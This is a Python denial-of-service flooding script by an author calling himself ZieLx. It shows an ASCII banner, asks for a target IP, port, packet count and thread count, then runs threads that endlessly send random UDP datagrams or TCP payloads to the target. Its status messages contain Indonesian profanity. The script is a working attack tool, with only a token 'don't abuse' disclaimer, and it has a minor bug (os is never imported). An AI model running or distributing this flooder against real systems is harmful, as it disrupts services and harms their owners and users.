#!/usr/bin/env python3
#Code by ZieLx
import random
import socket
import threading
 
os.system("clear")
print("=========================================================")
print(" [!] Author Tools : ZieLxxx                              ")
print(" [Note] : Please Don't Abuse Okay                        ")
print("=========================================================")

print("▒███████▒ ██▓▓█████  ██▓    ▒██   ██▒▒██   ██▒▒██   ██▒   ")
print("▒ ▒ ▒ ▄▀░▓██▒▓█   ▀ ▓██▒    ▒▒ █ █ ▒░▒▒ █ █ ▒░▒▒ █ █ ▒░   ")
print("░ ▒ ▄▀▒░ ▒██▒▒███   ▒██░    ░░  █   ░░░  █   ░░░  █   ░   ")
print("  ▄▀▒   ░░██░▒▓█  ▄ ▒██░     ░ █ █ ▒  ░ █ █ ▒  ░ █ █ ▒    ")
print("▒███████▒░██░░▒████▒░██████▒▒██▒ ▒██▒▒██▒ ▒██▒▒██▒ ▒██▒   ")
print("░▒▒ ▓░▒░▒░▓  ░░ ▒░ ░░ ▒░▓  ░▒▒ ░ ░▓ ░▒▒ ░ ░▓ ░▒▒ ░ ░▓ ░   ")
print("░░▒ ▒ ░ ▒ ▒ ░ ░ ░  ░░ ░ ▒  ░░░   ░▒ ░░░   ░▒ ░░░   ░▒ ░   ")
print("░ ░ ░ ░ ░ ▒ ░   ░     ░ ░    ░    ░   ░    ░   ░    ░     ")
print("  ░ ░     ░     ░  ░    ░  ░ ░    ░   ░    ░   ░    ░     ")
print("░                                                         ")

ip = str(input(" IP TARGET : "))
port = int(input(" PORT TARGET : "))
choice = str(input(" ATTACK ? (y/n) : "))
times = int(input(" PACKETS : "))
threads = int(input(" THREADS : "))
def run():
	data = random._urandom(1024)
	i = random.choice(("[TOK!!]","[TOK!!]","[TOK!!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" NIH PACKET DARI ZIELX NGENTOT")
		except:
			print("[!] MT KAH MANISSS")

def run2():
	data = random._urandom(16)
	i = random.choice(("[TOK!!]","[TOK!!]","[TOK!!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" NIH PACKET DARI ZIELX NGENTOT")
		except:
			s.close()
			print("[*] MT KAH MANISSS")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
